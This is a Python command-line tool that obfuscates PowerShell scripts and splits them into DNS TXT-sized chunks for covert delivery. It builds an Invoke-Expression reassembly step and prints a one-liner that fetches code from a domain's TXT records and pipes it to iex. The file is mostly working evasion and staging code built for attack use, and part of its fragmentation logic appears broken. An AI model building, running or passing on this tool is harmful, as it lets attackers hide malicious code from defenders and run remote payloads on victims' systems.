#!/usr/bin/env python3
"""
DNS-Compatible PowerShell Obfuscator
Author: Senior Python Developer (10+ years TI experience)
Description: Advanced obfuscation with DNS TXT field distribution support
"""

import argparse
import random
import string
import re
import textwrap
from typing import List, Dict, Tuple, Optional

class DnsPowerShellObfuscator:
    def __init__(self):
        self.var_pool: List[Tuple[str, str]] = []
        self.used_names: set = set()
        self.chunk_size = 200  # DNS TXT field limit
        self.techniques = {
            'string_split': self._string_fragmentation,
            'ascii_char': self._multi_layer_ascii,
            'dynamic_invoke': self._command_fragmentation,
            'variable_reuse': self._garbage_injection
        }

    def _generate_var_name(self, prefix: str = '$') -> str:
        """Generate unique PowerShell variable name"""
        while True:
            name = prefix + ''.join(random.choices(
                string.ascii_letters + string.digits,
                k=random.randint(8, 12)
            ))
            if name not in self.used_names:
                self.used_names.add(name)
                return name

    def _string_fragmentation(self, code: str) -> str:
        """Multi-level string fragmentation with nested joins"""
        def process_string(match: re.Match) -> str:
            s = match.group(1)
            if len(s) < 4:  # Skip short strings
                return match.group(0)

            # Create 3-level fragmentation
            parts = [s[i:i+random.randint(1,3)] for i in range(0, len(s), random.randint(1,3))]
            part_vars = []

            for i, part in enumerate(parts):
                part_var = self._generate_var_name()
                self.var_pool.append((part_var, part))
                part_vars.append(part_var)
                code_parts.append(f"{part_var}='{part}'")

            # Create nested join structure
            join_var = self._generate_var_name()
            nested_join = f"{join_var}={'+'.join(part_vars)}"
            code_parts.append(nested_join)
            return join_var

        code_parts = []
        result = []
        for line in code.split('\n'):
            if not line.strip() or line.strip().startswith('#'):
                result.append(line)
                continue

            # Process all strings in the line
            modified_line = re.sub(r'"([^"]*)"', process_string, line)
            if code_parts:
                modified_line = ';'.join(code_parts) + ';' + modified_line
                code_parts.clear()
            result.append(modified_line)

        return '\n'.join(result)

    def _multi_layer_ascii(self, code: str) -> str:
        """ASCII obfuscation with random math operations"""
        def char_to_obfuscated(c: str) -> str:
            val = ord(c)
            # Randomly apply math obfuscation
            if random.random() > 0.6:
                delta = random.randint(1, 5)
                operation = random.choice(['+', '-'])
                return f"[char]({val}{operation}{delta})"
            return f"[char]{val}"

        def process_string(match: re.Match) -> str:
            s = match.group(1)
            if len(s) < 3:
                return match.group(0)

            # Create chunked ASCII conversion
            var_name = self._generate_var_name()
            char_codes = ','.join(char_to_obfuscated(c) for c in s)
            self.var_pool.append((var_name, s))
            return f"(-join({char_codes}))"

        return re.sub(r'"([^"]*)"', process_string, code)

    def _command_fragmentation(self, code: str) -> str:
        """Command fragmentation with dynamic invocation"""
        def process_command(match: re.Match) -> str:
            cmd = match.group(1)
            if len(cmd) < 4:
                return match.group(0)

            # Split command into random parts
            split_pos = random.randint(1, len(cmd)-1)
            part1, part2 = cmd[:split_pos], cmd[split_pos:]

            var1 = self._generate_var_name()
            var2 = self._generate_var_name()
            self.var_pool.extend([(var1, part1), (var2, part2)])

            return f"(& ({var1}+{var2}))"

        return re.sub(r'\b([a-zA-Z-]{2,})\b(?![\'"])', process_command, code)

    def _garbage_injection(self, code: str) -> str:
        """Advanced garbage injection with valid syntax"""
        digits = []
        for _ in range(8):
            digits.append(str(random.randint(0,9)))

        digits_str = ','.join(digits)

        garbage_patterns = [
            lambda: f"{self._generate_var_name()}=[System.Net.Dns]::GetHostName()",
            lambda: f"{self._generate_var_name()}=$([Environment]::OSVersion.VersionString)",
            lambda: f"{self._generate_var_name()}=$([Math]::Pow(2,{random.randint(2,8)}))",
            lambda: f"{self._generate_var_name()}=$(''.Join('',({digits_str})))"
        ]

        lines = code.split('\n')
        for i in range(len(lines)):
            if lines[i].strip() and not lines[i].strip().startswith('#') and random.random() > 0.7:
                lines[i] = random.choice(garbage_patterns)() + ';' + lines[i]

        # Randomly reuse variables from pool
        if self.var_pool and random.random() > 0.5:
            var, value = random.choice(self.var_pool)
            lines.insert(0, f"{var}='{value}'")

        return '\n'.join(lines)

    def _prepare_dns_chunks(self, code: str) -> List[str]:
        """Prepare code for DNS TXT distribution"""
        # Convert to one-liner
        oneliner = ';'.join(
            line.strip() for line in code.split('\n')
            if line.strip() and not line.strip().startswith('#')
        )

        # Split into DNS-friendly chunks
        chunks = textwrap.wrap(
            oneliner,
            width=self.chunk_size - 10,  # Account for wrapper chars
            break_long_words=True,
            replace_whitespace=False
        )

        # Create chunked payload with reassembly instruction
        reassembly_var = self._generate_var_name()
        chunked_code = [
            f"{reassembly_var}=@(",
            *[f"    '{chunk}'" for chunk in chunks],
            ");",
            f"$payload=-join{reassembly_var};",
            "Invoke-Expression $payload"
        ]

        return chunked_code

    def obfuscate(self, code: str, techniques: List[str], output_format: str) -> str:
        """Apply obfuscation with format conversion"""
        # Apply techniques in random order
        random.shuffle(techniques)
        for tech in techniques:
            if tech in self.techniques:
                code = self.techniques[tech](code)

        if output_format == 'oneliner':
            return ';'.join(
                line.strip() for line in code.split('\n')
                if line.strip() and not line.strip().startswith('#')
            )
        elif output_format == 'dns_txt':
            return '\n'.join(self._prepare_dns_chunks(code))

        return code

def main():
    parser = argparse.ArgumentParser(
        description="DNS-Compatible PowerShell Obfuscator",
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        '-i', '--input',
        required=True,
        help='Input PowerShell script file (.ps1)'
    )

    parser.add_argument(
        '-o', '--output',
        required=True,
        help='Output file path'
    )

    parser.add_argument(
        '-t', '--techniques',
        nargs='+',
        choices=['string_split', 'ascii_char', 'dynamic_invoke', 'variable_reuse', 'all'],
        default=['all'],
        help="""Obfuscation techniques:
  string_split  : Multi-level string fragmentation
  ascii_char    : ASCII conversion with math ops
  dynamic_invoke: Command fragmentation
  variable_reuse: Advanced garbage injection
  all           : All techniques combined"""
    )

    parser.add_argument(
        '-f', '--format',
        choices=['script', 'oneliner', 'dns_txt'],
        default='script',
        help="""Output format:
  script   : Normal PowerShell script
  oneliner : Single command line
  dns_txt  : DNS TXT compatible chunks"""
    )

    args = parser.parse_args()

    if 'all' in args.techniques:
        args.techniques = ['string_split', 'ascii_char', 'dynamic_invoke', 'variable_reuse']

    try:
        with open(args.input, 'r', encoding='utf-8') as f:
            ps_code = f.read()

        obfuscator = DnsPowerShellObfuscator()
        obfuscated = obfuscator.obfuscate(ps_code, args.techniques, args.format)

        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(obfuscated)

        print(f"[*] Obfuscation complete. Output saved to {args.output}")
        if args.format == 'dns_txt':
            print("[!] DNS TXT payload requires reassembly via:")
            print('    (Resolve-DnsName <domain> -Type TXT).Strings -join "" | iex')

    except Exception as e:
        print(f"[!] Error: {str(e)}")
        exit(1)

if __name__ == '__main__':
    main()